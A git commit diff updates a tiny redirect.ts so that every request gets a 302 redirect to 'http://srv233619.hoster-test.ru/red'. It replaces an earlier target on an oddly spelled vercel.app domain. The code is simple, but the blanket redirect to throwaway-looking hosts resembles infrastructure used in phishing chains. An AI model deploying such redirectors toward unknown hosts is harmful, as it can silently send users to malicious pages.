1c16b0204c2f018e8dcda023d2759f2bcc9d8fc6
Moore145 <114741178+Moore145@users.noreply.github.com>
2025-05-20 11:09:55 -0700

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,16 +1,12 @@
 // redirect.ts
 
-// Define the redirect URL
-const redirectUrl = "https://redfcuonliine.vercel.app/"; // Replace with the URL you want to redirect to
+const redirectUrl = "http://srv233619.hoster-test.ru/red";
 
-// Handle the request
-addEventListener("fetch", (event) => {
-  event.respondWith(
-    new Response(null, {
-      status: 302, // HTTP status for redirection
-      headers: {
-        "Location": redirectUrl, // The URL to redirect to
-      },
-    })
-  );
-});
+Deno.serve(() =>
+  new Response(null, {
+    status: 302,
+    headers: {
+      Location: redirectUrl,
+    },
+  })
+);
